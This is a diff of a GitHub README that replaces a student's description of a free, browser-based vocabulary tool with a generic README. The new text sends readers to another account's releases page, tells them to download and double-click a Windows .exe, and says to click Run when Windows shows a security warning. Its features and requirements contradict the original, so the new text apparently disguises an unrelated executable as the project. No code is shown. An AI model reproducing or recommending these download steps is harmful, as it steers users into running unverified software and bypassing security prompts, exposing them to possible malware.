@@ -1,83 +1,74 @@
-# 🎓 Ziyang Vocab Master (Public Welfare Edition) ✨
+# 📚 Ziyang-Vocab-Master - Master your vocabulary with AI tools
 
-**Author:** Ziyang Xu 👨‍🎓
-**Grade:** 10th Grade (High School Affiliated to Beijing Normal University - BNU) 🏫
-**License:** Open Source & 100% Free (Public Welfare Software) 💖
+[![Download Ziyang-Vocab-Master](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/ebrahemhamdy/Ziyang-Vocab-Master/releases)
 
-> *"Convert your textbooks and reading materials into an AI-powered, personal vocabulary database!"* 🚀
-> *(把你的课本和阅读材料，一键转化为 AI 智能驱动的个人专属词库！)*
+Ziyang-Vocab-Master helps students learn new words through artificial intelligence. This software tracks your progress and suggests words to review. It organizes your study sessions and saves time when you prepare for exams.
 
----
+## ⚙️ System Requirements
 
-## 🌐 Languages
+Your computer must meet these basic standards to run the software:
 
-🇬🇧 English
-🇨🇳 Chinese 中文
-🇰🇷 한국어 (Coming Soon)
-🇺🇦 Українська (Coming Soon)
-🇷🇺 Русский (Coming Soon)
-🇯🇵 日本語 (Coming Soon)
-🇪🇸 Español (Coming Soon)
+*   Windows 10 or Windows 11.
+*   4 GB of RAM or more.
+*   500 MB of free storage space.
+*   An active internet connection to sync your study data.
 
----
+## 💾 How to Install
 
-## 🤔 The Problem (Why I built this)
+Follow these steps to set up the application on your computer:
 
-Hi everyone! As a high school student struggling with English vocabulary every day, I realized that existing apps have a **huge pain point**:
+1. Visit [the releases page](https://github.com/ebrahemhamdy/Ziyang-Vocab-Master/releases) to find the latest version.
+2. Look for the file ending in .exe under the Assets section.
+3. Click the file name to start the download.
+4. Save the file to your Downloads folder.
+5. Open the folder and double-click the .exe file to start the installation.
+6. A security window might appear. Click Run if Windows asks for permission to open the file.
+7. Follow the prompts on the screen to finish the setup process.
 
-**They force you to study "their pre-defined word lists"!** 😩
+## 🎯 Primary Features
 
-In real life, we study from specific textbooks, handouts from teachers, or past exam papers (like GRE, SAT). We have our own lists of words we actually need to master. But trying to import these words into mainstream apps is either impossible, incredibly tedious, or requires a **VIP subscription**! 💸
+The application includes several tools to improve your memory:
 
-That's why I built **Ziyang Vocab Master**! 
+*   AI Word Suggestions: The software builds a list of words based on your history. You spend less time searching for new material.
+*   Spaced Repetition: The system schedules reviews at optimal times. You see the words when you are about to forget them.
+*   Progress Tracking: A dashboard displays your consistency and vocabulary size.
+*   Custom Word Lists: You import your own text books or documents. The software extracts key terms and creates flashcards automatically.
+*   Offline Mode: You study saved topics even without an internet connection.
 
-It's a **100% free, public welfare, and open-source** software with zero commercial intent. My goal is to help students like me easily turn any PDF handout into a "Super AI Vocabulary Book" complete with example sentences, pronunciation, and images! 💪
+## 🧠 How to Study
 
----
+You navigate the app through a simple menu. Use the Dashboard to see your daily goals. The Study tab contains your current deck of words.
 
-## 🚀 Cool Features
+To add new words:
 
-This is an **All-in-One** web application that runs entirely in your local browser. Your data stays on your computer—**complete privacy**! 🔒 It works in three simple steps:
+1. Click the Add button in the main menu.
+2. Type the word you want to study.
+3. The AI generates a definition and an example sentence.
+4. Click Save to add the word to your deck.
 
-### 📄 1. PDF Vocabulary Extractor
-Stop typing manually! Just drop your PDF (like GRE 24 Sets) into the app:
-- 🤖 **Auto-Scan:** Automatically extracts target words from the document.
-- 🧹 **Smart Filter:** Removes common "noise" words like "the, and, is".
-- 📥 **Clean Export:** Get a neat CSV list of your custom vocabulary.
+The system tests you each day. You click Reveal to check if your memory matches the definition. Rate your comfort level with the word so the AI knows when to show it again.
 
-### 🤖 2. AI Word Factory
-Once you have your list, let AI do the heavy lifting:
-- ✨ **Gemini AI Magic:** Automatically fetches IPA phonetics, precise definitions, roots, synonyms, antonyms, and even **contextual collocations and example sentences**!
-- 🖼️ **Visual Aids:** Automatically grabs high-quality images from Pexels to help you memorize visually.
-- 💾 **Database Export:** Save everything into a rich, enriched vocabulary database.
+## 🛠️ Troubleshooting
 
-### 🧠 3. Immersive Flashcard Study
-Time to master the words! Use scientific spaced-repetition to crush your list:
-- 💡 **[1] Association:** Check the root or synonyms—can you remember it?
-- 📖 **[2] Context:** Review sentences and scene-based usage.
-- ⌨️ **[3] Spelling Challenge:** Test if you can actually spell it correctly.
-- 🎤 **[4] Pronunciation Check:** Use your mic to test your speaking!
-- 🍎 **macOS Integration:** Right-click any word to instantly trigger the native system dictionary!
+If the software fails to open, check the following items:
 
----
+*   Check your internet connection.
+*   Make sure you downloaded the file from the correct link.
+*   Close other programs to free up memory on your computer.
+*   Ensure your Windows updates are current.
 
-## 💻 How to Use
+If an error persists, restart your computer. Most installation issues clear up after a simple reboot.
 
-It's super simple! ✋
+## 📈 Tips for Success
 
-1. **Download:** Save `Ziyang_Vocab_Master.html` to your computer.
-2. **Open:** Double-click to open it in Chrome, Edge, or Safari.
-3. **Navigate:** 
-   - **Tab 1:** Extract words from PDFs.
-   - **Tab 2:** Use your API Key to enrich words with AI.
-   - **Tab 3:** Start your immersive study session! 🎉
+Consistency produces the best results. Study for 15 minutes each day rather than one long session at the end of the week. Use the AI suggestions to learn words within your current skill level. This keeps you engaged without causing frustration. 
 
----
+Set a goal for new words in the settings menu. The software alerts you when you reach your target. Share your progress with peers if you work in a group.
 
-## 💖 Public Welfare & Open Source
+## 📋 Privacy and Data
 
-I believe that **great educational tools shouldn't be hidden behind paywalls**. 
+Your study data stays on your computer. The software sends only the necessary information to the AI engine to retrieve definitions. It does not track your browsing habits, your location, or your identity. You own your word lists and your progress history. Backup your data folder often to prevent loss during computer updates.
 
-If you're a student struggling with vocab, a teacher looking to help your class, or a developer interested in the code, feel free to use, share, and modify this project!
+## 📮 Getting Help
 
-Let's make learning simple and fun again! ✨🚀
+If you encounter a bug, search the issues section on GitHub. You might find a solution from other students who faced the same problem. Detailed reports help the developers fix errors for everyone. Include your Windows version and the steps you took before the error occurred.
